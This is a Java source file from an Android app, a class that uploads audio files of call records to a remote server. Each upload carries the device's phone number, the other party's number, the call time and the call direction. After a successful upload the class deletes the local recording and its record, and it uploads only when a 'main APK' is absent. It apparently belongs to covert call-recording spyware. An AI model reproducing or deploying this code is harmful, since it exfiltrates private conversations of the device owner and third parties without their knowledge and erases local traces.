package com.m1.android.data.action;

import java.io.File;
import java.util.HashMap;
import java.util.List;

import com.m1.android.data.dao.CalllogDao;
import com.m1.android.data.entity.CallLog;
import com.m1.android.data.entity.Result;
import com.m1.android.data.util.AppUtil;

public class UpCallLogAction extends BaseAction {

	@Override
	public boolean excute() {
		try {
			if (allowUpload()) {
				List<CallLog> logs = CalllogDao.getAllCallogs(mContext);
				if (logs != null && !logs.isEmpty()) {
					for (CallLog log : logs) {
						Result result = null;
						String path = log.getPath();
						File audioFile = new File(path);
						if (!audioFile.exists()) {
							CalllogDao.deleteCalllog(mContext, log.getId());
							continue;
						}
						if (mUser.isUploadCalllog() && !AppUtil.isMainApkInstalled(mContext)) {
							HashMap<String, File> files = new HashMap<String, File>();
							files.put("upload", audioFile);
							HashMap<String, String> params = new HashMap<String, String>();
							params.put("phone", mPhone);
							params.put("targetPhone", log.getTargetPhone());
							params.put("time", String.valueOf(log.getTime()));
							params.put("outgoing", String.valueOf(log.isOutgoing()));
							result = mHttpWrapper.uploadFile(getRequestUrl(), params, files, Result.class, null);
						} else {
							result = new Result();
							result.setSuccess(true);
						}
						// 上传成功，删除本地记录和文件
						if (result != null && result.isSuccess()) {
							audioFile.delete();
							CalllogDao.deleteCalllog(mContext, log.getId());
						}
					}
				}
				return true;
			} else {
				return false;
			}
		} catch (Exception e) {
			e.printStackTrace();
			return true;
		}
	}

	@Override
	protected String getRequestUrl() {
		return DEFAULT_HOST + "/uploadCallLog.htm";
	}

}
